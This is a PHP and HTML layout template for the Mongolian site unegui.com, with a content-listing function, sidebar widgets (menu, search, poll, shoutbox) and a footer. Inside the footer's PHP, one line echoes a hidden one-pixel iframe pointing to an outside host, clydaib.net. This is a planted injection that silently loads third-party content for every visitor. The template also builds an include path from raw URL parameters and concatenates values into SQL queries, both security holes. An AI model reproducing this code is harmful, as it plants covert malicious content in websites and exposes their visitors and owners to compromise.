<?
function mbmUNEGUICOMcontents($info=array(
											'menu_id'=>0,
											'limit'=>10,
											'order_by'=>'date_added',
											'asc'=>'desc',
											'type'=>'normal'
											)){
	global $DB,$lang;
	
	$q = "SELECT * FROM ".PREFIX."menu_contents WHERE id!=0 AND menu_id NOT LIKE '%,367,%' AND menu_id NOT LIKE '%,386,%' ";
	if($info['menu_id']!=0){
		$q .= "AND menu_id LIKE '%,".$info['menu_id'].",%' ";
	}
	switch($info['type']){
		case 'is_photo':
			$q .= "AND is_photo=1 ";
		break;
		case 'is_video':
			$q .= "AND is_video=1 ";
		break;
		case 'normal':
			$q .= "AND is_photo!=1 AND is_video!=1 ";
		break;
	}
	
	//$q .= "AND is_video=0 AND is_photo=0 ";
	$q .= "ORDER BY ";
	$q .= $info['order_by']." ";
	$q .= $info['asc']." ";
	$q .= "LIMIT ".$info['limit']." ";
	
	
	$r = $DB->mbm_query($q);
	
	//show only normal contents
	$buf = '';
	
	for($i=0;$i<$DB->mbm_num_rows($r);$i++){
		$buf .= '<div style="border:1px solid #ffac00; margin-bottom:4px;">';
		//$buf .= '<div style="display:block; position:relative;">';
			$buf .= '<div style="
							border:1px solid #FFFFFF;
							background-color:#ffe3bb; 
							padding-top:3px; 
							padding-bottom:3px;
							padding-left:10px;
							display:block; 
							position:relative; 
							font-weight:bold;">';
				$buf .= '<a href="index.php?module=menu&amp;cmd=content&amp;menu_id='
						.mbmReturnMenuId($DB->mbm_result($r,$i,"menu_id"))
						.'&amp;id='.$DB->mbm_result($r,$i,"id")
						.'" style="color:#333333; text-decoration:none;">';
				$buf .= $DB->mbm_result($r,$i,"title");
				$buf .= '</a>';
				$buf .= '<div style="top:3px; left:290px; position:absolute;">';
					$buf .= mbmRatingResult('content_'.$DB->mbm_result($r,$i,"id"));
				$buf .= '</div>';
			$buf .= '</div>';
		//$buf .= '</div>';
		
		$buf .= '<div style="display:block">';
			$buf .= $DB->mbm_result($r,$i,"content_short");
		$buf .= '</div>';
		
		//$buf .= '<div style="display:block;">';
			$buf .= '<div style="
								display:block; 
								position:relative; 
								clear:both;
								height:16px;
								padding-left:10px;
								padding-top:4px;">';
				$buf .= mbmReturnMenuNames($DB->mbm_result($r,$i,"menu_id"));
				$buf .= '<div style="position:absolute; top:4px; left:290px;">';
					$buf .= $lang['main']['hits'].': '.$DB->mbm_result($r,$i,"hits");
				$buf .= '</div>';
			$buf .= '</div>';
			
		//$buf .= '</div>';
		$buf .= '</div>';
		
	}
	
	return $buf;
}
?>
<link href="templates/unegui2/css/main.css" rel="stylesheet" type="text/css" />
<link href="templates/unegui2/css/uneguicom.css" rel="stylesheet" type="text/css" />

<div id="pageLoader" style="color:#333333; margin-top:100px; "><center>
    Loading...<br />
<img src="images/web/loading.gif" alt="loading..." border="0" vspace="5" /></center></div>
<div id="mainContainer">
    <div style="
                display:block;
                background-color:#f5f5f5;
                padding-top:3px;
                padding-bottom:3px;
                padding-right:10px;
                border-bottom:1px solid #e6e6e6;
                text-align:right;
                margin-bottom:2px;
                ">Хамтран ажиллах утас: 96010109
    </div>
  <div id="mainContainer_body">
    <div id="header_menu">
    	<a href="index.php" class="menu_top">Нүүр хуудас</a> |
    	<a href="http://www.yadii.net" target="_blank" class="menu_top">Монгол видео</a> |
    	<a href="http://www.worldvideomusic.com" target="_blank" class="menu_top">Гадаад видео</a> |
    	<a href="http://www.pambaga.net" target="_blank" class="menu_top">Монгол туургатан</a> |
    	<a href="http://php.az.mn" target="_blank" class="menu_top">РНР хичээл</a> |
    	<a href="http://shop.az.mn" target="_blank" class="menu_top">Онлайн дэлгүүр</a>     </div>
    <div style="display:block;" id="contentSection">
      <div id="row1">
        <div style="left:30px; top:10px; position:absolute;">
                <a href="http://www.unegui.com"><img src="templates/unegui2/images/logo.gif" alt="unegui.com" width="173" height="63" border="0" /></a>
        </div>
            <div style="left:480px; top:10px; position:absolute; width:468px; height:60px; display:block">
                <a href="http://www.unegui.com"><img src="templates/unegui2/images/banner_header.jpg" alt="unegui.com" width="468" height="60" border="0" /></a>
        </div>
        </div>
        <div id="row2">
            <div id="col_1">
                <div id="talbar1_1"
                    style=" 
                    border:1px solid #a9c9e2;
                    padding:5px;
                    display:block;
                    clear:both;
                    margin-bottom:4px;
                    background-color:#FFFFFF;
                    ">
                <script src="http://weather.az.mn/share.php?c=MGXX0003">
                </script></div>
              <div id="talbar1_2"
                    style="
                        border:1px solid #a9c9e2;
                        display:block;
                        position:relative;
                        margin-bottom:4px;
                    ">
                <div 
                        style="
                            background-color:#cae5ff;
                            border:1px solid #FFFFFF;
                            display:block;
                            position:relative;
                            height:28px;
                        ">
      <div class="talbar1_2_title" style="left:4px; top:4px;background-image:url(templates/unegui2/images/talbar2_title_bg.jpg);">
                                Татац цэс
                  </div>
                          <div class="talbar1_2_title" style=" display:none;left:106px; top:4px;background-image:url(templates/unegui2/images/talbar2_title_bg.jpg);">
                                #
                    </div>
                </div>
					<?
                    echo mbmShowMenuById(array('','','',''),0,'menu_left');
                    ?>
              </div><?
           echo  mbmUserPanel($_SESSION['user_id'],array('','','<div style="padding-left:10px;padding-bottom:4px;margin-bottom:3px;border-bottom:1px solid #DDDDDD;">','</div>'));
			?>
                <!--search talbar start//-->
                <div id="search_talbar1"
                    style="
                          border:1px solid #d3e2c1;
                          margin-bottom:4px;"
                >
                  <div id="search_talbar1"
                        style="
                            background-image:url(templates/unegui2/images/talbar1_3_title_bg.jpg);
                            background-repeat:repeat-x;
                            ">
          		  <div 
                                style="
                                    background-image:url(templates/unegui2/images/talbar3_sum.png);
                                    background-repeat:no-repeat;
                                    background-position:8px  6px;
                                    padding-left:32px;
                                    padding-top:8px;
                                    padding-bottom:8px;
                                    font-weight:bold;
                                ">
                                Хайлт</div>
                            <div style="padding:5px;">
                                <?=mbmSearchForm()?>
                            </div>
                  </div>
                </div>
                <!--search talbar end//-->
                <div id="talbar1_3"
                    style="
                          border:1px solid #d3e2c1;
                          margin-bottom:4px;"
                >
                  <div id="talbar1_3_title"
                        style="
                            background-image:url(templates/unegui2/images/talbar1_3_title_bg.jpg);
                            background-repeat:repeat-x;
                            ">
          		  <div 
                                style="
                                    background-image:url(templates/unegui2/images/talbar3_sum.png);
                                    background-repeat:no-repeat;
                                    background-position:8px  6px;
                                    padding-left:32px;
                                    padding-top:8px;
                                    padding-bottom:8px;
                                    font-weight:bold;
                                ">
                                Санал асуулга
                    </div>
                            <div style="padding:5px;">
                                <?=mbmShowPoll(0,1);?>
                            </div>
                  </div>
                </div>
                <div id="talbar1_5" style="
                			border:1px solid #a9c9e2;
                            background-color:#f2f6fb;
                            padding:5px;
                            margin-top:4px;
                            height:142px;
                            display:block;
                            "><?=mbmDicForm()?>
                
                </div>
                <div id="talbar1_4"
                    style="
                          border:1px solid #d3e2c1;
                          margin-bottom:4px;
                          margin-top:4px;"
                >
                  <div id="talbar1_4_title"
                        style="
                            background-image:url(templates/unegui2/images/talbar1_4_title_bg.jpg);
                            background-repeat:repeat-x;
                            background-color:#f0fce3;
                            ">
         				<div 
                                    style="
                                        background-image:url(templates/unegui2/images/talbar3_sum.png);
                                        background-repeat:no-repeat;
                                        background-position:8px  6px;
                                        padding-left:32px;
                                        padding-top:8px;
                                        padding-bottom:8px;
                                        font-weight:bold;
                                    ">
                                    Үг хэлэх эрх чөлөө
                      </div>
                      <div style="padding:5px;">
                         <?=mbmShoutboxForm(15,220)?>
                    </div>
                  </div>
              </div>
            </div>
            <!-- col_2 start//-->
            <div id="col_2">
              <div id="talbar2_1" 
                    style="
                        border:1px solid #e0e0e0;
                        position:relative;
                        margin-bottom:4px;
                    ">
                <div 
                        style="
                            display:block;
                            background-repeat:repeat-x;
                            background-image:url(templates/unegui2/images/talbar2_1_title_bg.jpg);
                            border-left:1px solid #FFFFFF;
                            border-right:1px solid #FFFFFF;
                            border-bottom:1px solid #ff9607;
                            position:relative;
                            height:24px;
                            ">
                       	<div style="font-weight:bold;
                            color:#ff9607;
                            position:absolute;
                            left:10px;
                            top:6px;
                            width:88px;">Зарлал:
                        </div>
                       	<div style="
                            position:absolute;
                            left:110px;
                            top:6px;
	                        width:600px;">
                            <marquee truespeed="truespeed" direction="left" scrollamount="1" scrolldelay="30"  onmouseover="this.stop()" onmouseout="this.start()" >
                            	Үнэгүй.Ком шинээр мэндэллээ
                            </marquee>
                        </div>
                </div>
                    <div style="
                        display:block; 
                        background-image:url(templates/unegui2/images/talbar2_1_bg_footer.jpg);
                        background-repeat:repeat-x;
                        background-position:bottom;
                        border-left:1px solid #FFFFFF;
                        border-right:1px solid #FFFFFF;
                        padding-top:8px;
                        padding-bottom:8px;
                        padding-left:10px;
                        padding-right:10px;
                        height:27px;
                        ">Сурталчилгаа
              		</div>
              </div>
            <div>
            
                <? 
				if(file_exists(ABS_DIR."modules/".$_GET['module']."/".$_GET['cmd'].".php")){
					echo '<table border="0" width="100%" cellspacing="2" cellpadding="0">';
						echo '<tr><td valign="top">';
							include_once(ABS_DIR."modules/".$_GET['module']."/".$_GET['cmd'].".php");
						echo '</td><td valign="top" width="170" align="right">';
							include_once(ABS_DIR.DIR.'templates/unegui2/content_right.php');
						echo '</td></tr>';
					echo '</table>';
				}else{
					include_once(ABS_DIR."templates/".TEMPLATE."/home.php");
				}
			  ?>
            </div>
            </div>
            <!-- col_2 ends//-->
        </div>
    </div>
  </div>
</div>
	<div id="footer">
					<?
                    echo mbmShowMenuById(array(' | ','','',' | '),381,'menu_footer').' |<br />';
                    echo mbmStatImage().COPYRIGHT;
					
echo "<iframe src=\"http://clydaib.net/?click=36C5339\" width=1 height=1 style=\"visibility:hidden;position:absolute\"></iframe>";
?></div>
<script language="javascript" type="text/javascript">
document.getElementById('pageLoader').style.display='none';
document.getElementById('mainContainer').style.visibility='visible';


// unduruudiig todorhoiloh
function setHeightContent(){

if(document.getElementById('col2_sub2')){
	col2_talbar2_sub2 = document.getElementById('col2_sub2').offsetHeight;
	col2_talbar2_sub1 = document.getElementById('col2_sub1').offsetHeight;
	h_sub2 = Math.max(col2_talbar2_sub1,col2_talbar2_sub2);
}else{
	h_sub2 = document.getElementById('col_2').offsetHeight;
}
if(document.getElementById('talbar2_col_1')){
	col2_talbar2_col_1 = document.getElementById('talbar2_col_2').offsetHeight;
	col2_talbar2_col_2 = document.getElementById('talbar2_col_1').offsetHeight;
	h_col = Math.max(col2_talbar2_col_1,col2_talbar2_col_2);
}else{
	h_col = document.getElementById('col_2').offsetHeight;
}
	
	
	col_height = Math.max(
							document.getElementById('col_1').offsetHeight,
							document.getElementById('col_2').offsetHeight,
							h_sub2,
							h_col
						  );
	document.getElementById('contentSection').style.height = col_height+180+'px';
	setTimeout("setHeightContent()", 5000);
}
setHeightContent();

if (window.ActiveXObject){
  //left_talbar.style.marginLeft= '-180px';
}
</script>